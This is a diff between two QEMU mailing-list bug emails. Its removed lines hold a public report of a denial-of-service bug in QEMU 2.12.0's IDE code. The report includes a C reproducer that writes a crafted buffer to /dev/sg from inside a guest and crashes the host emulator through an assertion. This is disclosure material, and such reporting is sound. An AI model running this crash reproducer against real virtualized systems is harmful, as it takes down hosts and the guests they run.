@@ -1,32 +1,33 @@
-Received: from eggs.gnu.org ([2001:4830:134:3::10]:38637)
+Received: from eggs.gnu.org ([2001:4830:134:3::10]:41737)
 	by lists.gnu.org with esmtp (Exim 4.71)
-	(envelope-from <bounces@canonical.com>) id 1fUVtO-0004eB-Nr
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:48 -0400
+	(envelope-from <bounces@canonical.com>) id 1fUWHU-0007yL-71
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:55:41 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
-	(envelope-from <bounces@canonical.com>) id 1fUVtJ-00059m-Ot
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:46 -0400
-Received: from indium.canonical.com ([91.189.90.7]:51726)
+	(envelope-from <bounces@canonical.com>) id 1fUWHP-0004eo-Bb
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:55:40 -0400
+Received: from indium.canonical.com ([91.189.90.7]:52814)
 	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
 	(Exim 4.71) (envelope-from <bounces@canonical.com>)
-	id 1fUVtJ-00058V-Hw
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:41 -0400
+	id 1fUWHP-0004e3-4x
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:55:35 -0400
 Received: from loganberry.canonical.com ([91.189.90.37])
 	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
-	id 1fUVtI-0004V0-I6
-	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:30:40 +0000
+	id 1fUWHO-0005UE-2E
+	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:55:34 +0000
 Received: from loganberry.canonical.com (localhost [127.0.0.1])
-	by loganberry.canonical.com (Postfix) with ESMTP id 7CE1F2E8030
-	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:30:40 +0000 (UTC)
+	by loganberry.canonical.com (Postfix) with ESMTP id ECB862E80C9
+	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:55:33 +0000 (UTC)
 MIME-Version: 1.0
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
-Date: Sun, 17 Jun 2018 11:17:15 -0000
+Date: Sun, 17 Jun 2018 11:48:24 -0000
 From: icytxw <1777315@bugs.launchpad.net>
 Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
 Sender: bounces@canonical.com
-Message-Id: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
+References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
+Message-Id: <152923610532.6776.9768633630622598132.launchpad@wampee.canonical.com>
 Errors-To: bounces@canonical.com
-Subject: [Qemu-devel] [Bug 1777315] [NEW] Denial of service
+Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
 List-Id: <qemu-devel.nongnu.org>
 List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
@@ -37,92 +38,7 @@ List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
 To: qemu-devel@nongnu.org
 
-Public bug reported:
-
-Hi,
-QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-2.=
-12.0
-
-run the program in qemu-2.12.0:
-#define _GNU_SOURCE =
-
-#include <endian.h>
-#include <sys/syscall.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <stdint.h>
-#include <string.h>
-
-static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
-{
-        if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
-                char buf[128];
-                sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "blo=
-ck", (uint8_t)a1, (uint8_t)a2);
-                return open(buf, O_RDWR, 0);
-        } else {
-                char buf[1024];
-                char* hash;
-strncpy(buf, (char*)a0, sizeof(buf) - 1);
-                buf[sizeof(buf) - 1] =3D 0;
-                while ((hash =3D strchr(buf, '#'))) {
-                        *hash =3D '0' + (char)(a1 % 10);
-                        a1 /=3D 10;
-                }
-                return open(buf, a2, 0);
-        }
-}
-
-uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
-void loop()
-{
-        long res =3D 0;
-memcpy((void*)0x20000000, "/dev/sg#", 9);
-        res =3D syz_open_dev(0x20000000, 0, 2);
-        if (res !=3D -1)
-                r[0] =3D res;
-        res =3D syscall(__NR_dup2, r[0], r[0]);
-        if (res !=3D -1)
-                r[1] =3D res;
-*(uint8_t*)0x20000ec0 =3D 0;
-*(uint8_t*)0x20000ec1 =3D 0;
-*(uint8_t*)0x20000ec2 =3D 0;
-*(uint8_t*)0x20000ec3 =3D 0;
-*(uint32_t*)0x20000ec8 =3D 0;
-*(uint8_t*)0x20000ed8 =3D 0;
-*(uint8_t*)0x20000ed9 =3D 0;
-*(uint8_t*)0x20000eda =3D 0;
-*(uint8_t*)0x20000edb =3D 0;
-memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\xb3=
-", 12);
-        syscall(__NR_write, r[1], 0x20000ec0, 0x323);
-}
-
-int main()
-{
-        syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
-        loop();
-        return 0;
-}
-this will crash qemu, output information:
- qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =3D=
-=3D s->sg.size' failed.
-
-
-Thanks =
-
-owl337
-
-** Affects: qemu
-     Importance: Undecided
-     Assignee: icytxw (icytxw)
-         Status: New
-
-** Changed in: qemu
-     Assignee: (unassigned) =3D> icytxw (icytxw)
+** Information type changed from Private Security to Public Security
 
 -- =
 
